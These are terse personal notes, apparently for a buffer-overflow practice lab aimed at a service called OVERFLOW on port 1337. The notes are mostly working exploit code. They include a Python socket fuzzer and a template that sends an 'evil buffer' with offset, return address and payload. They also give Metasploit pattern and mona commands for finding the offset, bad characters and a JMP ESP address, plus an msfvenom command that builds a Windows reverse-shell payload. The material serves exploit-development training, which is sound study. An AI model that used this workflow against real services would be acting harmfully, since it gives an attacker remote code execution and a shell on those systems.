Immunity Debugger
!mona config -set workingfolder

fuzz with:

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.101.213"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

a = Number of bytes that crashed the server
c = a + 400
b = /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l c

2.py

```python
import socket

ip = "10.10.101.213"
port = 1337

prefix = "OVERFLOW2 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "$b"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

!mona findmsp -distance c
"EIP Contains normal pattern: ..."

OR
`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP>`

Put the value into the offset variable in 2.py
Set retn = "BBBB"
Run again and verify EIP 42424242

!mona bytearray -b "\x00"

```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Put the value of the python script into the payload variable
!mona compare -f C:\mona\oscp\bytearray.bin -a ESP-number
address =

!mona jmp -r esp -cbp "\x address"
https://defuse.ca/online-x86-assembler.htm#disassembly2
msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= EXITFUNC=thread -b "\x01\xA7\xFA\x30"
retn = reversed address

```

```
